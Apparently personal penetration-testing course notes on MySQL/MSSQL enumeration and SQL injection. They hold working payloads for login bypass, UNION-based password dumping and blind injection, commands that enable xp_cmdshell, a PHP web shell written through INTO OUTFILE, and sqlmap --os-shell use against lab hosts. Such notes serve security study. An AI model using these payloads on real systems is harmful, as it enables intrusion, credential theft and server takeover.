## Interacting with MySQL and MSSQL
#### Interacting with MySQL

>[!code]- Connect to a MySQL server
>Using mysql command:
>```bash
>kali@kali:~$ mysql -u root -p'root' -h 192.168.50.16 -P 3306
>```

>[!code]- Enumerate MySQL properties
>Version:
>```sql
>MySQL [(none)]> select version();
>MySQL [(none)]> select @@version;
>```
>Current database user:
>```sql
>MySQL [(none)]> select system_user();
>```

>[!code]- Enumerate the database
>Show available databases:
>```sql
>MySQL [(none)]> show databases;
>```
>
>Select a database:
>```sql
>MySQL [(none)]> use DATABASE;
>```
>
>Show tables:
>```sql
>MySQL [(none)]> show tables;
>```
#### Interacting with MSSQL

>[!code]- Connect to a MSSQL server:
>Using impacket:
>- **-windows-auth** forces NTLM authentication (as opposed to Kerberos)
>```bash
>kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
>```

>[!code]- Show MSSQL version
>```sql
>SQL>SELECT @@version;
>```

>[!code]- Enumerate the database
>List all available databases:
>```sql
>SQL>SELECT name FROM sys.databases;
>```
>The _master_, _tempdb_, _model_ and _msdb_ databases are default ones.
>___
>List the tables within a database:
>```sql
>SQL>SELECT * FROM offsec.information_schema.tables;
>```
>___
>List the records within a table:
>```sql
>SQL>select * from offsec.dbo.users;
>```

>[!code]- Edit the database
## Manual SQL Injection

#### Error-based payloads

>[!code]- Test for syntax errors
>In a login form, put one of the fields as `offsec'` (or similar). An outputted error suggests the underlying SQL logic isn't cleansing the inputted data before submitting it.

>[!code]- SQLi payloads
>```sql
>offsec' OR 1=1 -- //
>' or 1=1 in (select @@version) -- //
>' OR 1=1 in (SELECT * FROM users) -- //
>' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
>```
#### UNION-based payloads

>[!info]- What is a UNION SQLi attack?
>The UNION keyword enables execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement.

>[!warning]- Limitation - two conditions are required to work
>To conditions are required to work:
>1. The inject **UNION** query has to include the same number of columns as the original query
>2. The data types need to be compatible between each column

>[!code]- Determine the number of columns in the target table
>The following statement orders the results by a specific column, meaning it will fail whenever the selected column doesn't exist:
>```sql
>' ORDER BY 1-- // (works)
>' ORDER BY 2-- // (works)
>' ORDER BY 3-- // (works)
>' ORDER BY 4-- // (works)
>' ORDER BY 5-- // (works)
>' ORDER BY 6-- // (fails!!!! - there must be only 5 columns)
>```

>[!code]- Determine what columns can be used
>When we attempt to output data in the first column, it doesn't get outputted. This is probably because the first column in the target table contains the ID, and the app purposefully doesn't output this. Therefore, our payload can be changed to add a `null` in the first column (and second to make it 5 columns in total):
>```sql
>' UNION SELECT database(), user(), @@version, null, null -- //
>' UNION SELECT null, null, database(), user(), @@version -- //
>```

>[!success]- There are five columns in the target table and all can be used bar the first one

>[!code]- UNION-based SQLi payloads
>Enumerate the database properties:
>```sql
>' UNION SELECT null, null, database(), user(), @@version -- //
>```
>Enumerate the tables in a database:
>- We'll attempt to retrieve the _columns_ table from the _information_schema_ database belonging to the current database.
>```sql
>' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
>```
>Dump all rows from the _users_ table:
>```sql
>' UNION SELECT null, username, password, description, null FROM users -- //
>```
#### Blind SQL Injections

>[!info]- Info - Blind injections relate to when the database responses are not returned
>The SQL server behaviour is therefore inferred using either boolean- or time-based logic.

>[!code]- Test for boolean- or time-based SQLi
>The application takes a `user` parameter as input for the submitted SQL query.
>___
>The boolean-based payload:
>- Since _1=1_ will always be TRUE, the application returns the values only if the _offsec_ user is present in the database
>```
>http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
>```
>___
>
The time-based payload:
>- The _IF_ condition will execute only if the _offsec_ user is present in the database. We'll know if its executes because the web app will hang for about three seconds.
>```
>http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
>```
## Manual Code Execution with xp_cmdshell

>[!exploit]- Exploit - the MSSQL _xp_cmdshell_ function executes the inputted string

>[!warning]- Limitation - the _xp_cmdshell_ function is disabled by default

>[!code]- Enable the MSSQL _xp_cmdshell_ function
>Connect to an MSSQL server:
>```bash
>kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
>```
>Enable the _xp_cmdshell_ function:
>- Enable _show advanced options_ by setting its value to 1
>- Apply the changes to the running configuration via the **RECONFIGURE** statement
>- Enable _xp_cmdshell_ and apply the configuration again using **RECONFIGURE**
>```sql
>SQL> EXECUTE sp_configure 'show advanced options', 1;
>SQL> RECONFIGURE;
>SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
>SQL> RECONFIGURE;
>```
#### Execute a simple command
 
>[!code]- Execute commands with _xp_cmdshell_
>Run whoami:
>```sql
>SQL> EXECUTE xp_cmdshell 'whoami';
>```
#### Generate a web shell

>[!code]- Write a PHP webshell file to the victim
>Write the file to disk via the INTO OUTFILE command:
>- We'll use a UNION-based payload but include a single PHP line into the first column and save it as **webshell.php** in a writable web folder.
>```sql
>' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE
"/var/www/html/tmp/webshell.php" -- //
>```
>The resultant PHP contains:
>- The PHP _system_ function will parse any statement included in the _cmd_ parameter
>```php
><? system($_REQUEST['cmd']); ?>
>```

>[!code]- Execute a command via the PHP webshell
>Execute the `id` command:
>![Pasted image 20240602120832](../Images/Pasted%20image%2020240602120832.png)
## Automate the SQLi with sqlmap

>[!code]- Use sqlmap on GET-request inputs
>Test if vulnerable:
>  **-u** to set the URL we want to scan
>- **-p** to specify which parameter accepts the SQL command
>```bash
>kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
>```
>Dump database information
>```bash
>kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
>```

>[!code]- Use sqlmap on POST-request inputs
>Submit a dummy request and save it to a text file (either via Burp or the browser developer tools).
>
>Then run the sql command:
>- **-r** to specify the text file containing the POST request
>- **-p** to specify the vulnerable parameter
>- **-os-shell** to specify we want to be able to attempt to obtain a shell
>- **--web-root** to specify a writeable folder (which sqlmap uses to store a malicious file)
>```bash
>kali@kali:~$ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
>```